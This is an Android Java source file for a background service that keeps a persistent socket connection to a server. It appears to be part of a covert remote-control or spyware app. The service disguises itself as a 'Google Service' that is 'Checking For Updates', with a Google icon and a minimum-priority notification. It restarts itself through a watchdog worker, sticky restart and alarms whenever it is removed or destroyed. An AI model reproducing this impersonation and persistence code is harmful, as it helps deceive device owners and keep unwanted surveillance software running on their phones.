package com.topdown.softy.server.socket;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.Settings;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.topdown.softy.R;
import com.topdown.softy.functions.managers.SocketManager;
import com.topdown.softy.functions.worker.ServiceWatchdogWorker;

import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;


public class SocketService extends Service {

    private static final Logger LOGGER = Logger.getLogger(SocketService.class.getName());
    private static final String CHANNEL_ID = "socket_channel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;
    private SocketManager socketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        LOGGER.log(Level.SEVERE, "onCreate Called ............");

        isRunning = true;

        createNotificationChannel();
        addWatchDogWorker();
        startForeground(NOTIFICATION_ID, createMinimalNotification());

        socketManager = new SocketManager(this);
        socketManager.connect();

    }

    private void addWatchDogWorker() {
        LOGGER.log(Level.SEVERE, "WatchdogWorker running...");
        PeriodicWorkRequest watchdogRequest = new PeriodicWorkRequest.Builder(
                ServiceWatchdogWorker.class,
                15, TimeUnit.MINUTES)
                .build();

        WorkManager.getInstance(getApplicationContext())
                .enqueueUniquePeriodicWork(
                        "SocketServiceWatchdog",
                        ExistingPeriodicWorkPolicy.KEEP,
                        watchdogRequest);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        LOGGER.log(Level.SEVERE, "onTaskRemoved Called ............");

        Intent restartServiceIntent = new Intent(getApplicationContext(), SocketService.class);
        PendingIntent restartServicePendingIntent =
                PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restarts if killed
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_MIN);
        channel.setDescription("Checking For Updates");

        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createMinimalNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Google").setContentText("Checking For Updates...").setSmallIcon(R.drawable.ic_google) // Transparent icon
                .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        LOGGER.log(Level.SEVERE, "onDestroy Called ................");

        socketManager.disconnect();

        isRunning = false;
        // Attempt to restart service
        Intent restartIntent = new Intent(getApplicationContext(), SocketService.class);
        PendingIntent restartPendingIntent = PendingIntent.getService(
                getApplicationContext(),
                1,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // API 31+
            if (!alarmManager.canScheduleExactAlarms()) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM,
                        Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                return;
            }
        }

        if (alarmManager != null) {
            LOGGER.log(Level.SEVERE, "Alarm Manager Activated!");
            alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 1000,
                    restartPendingIntent
            );
        }

    }

}

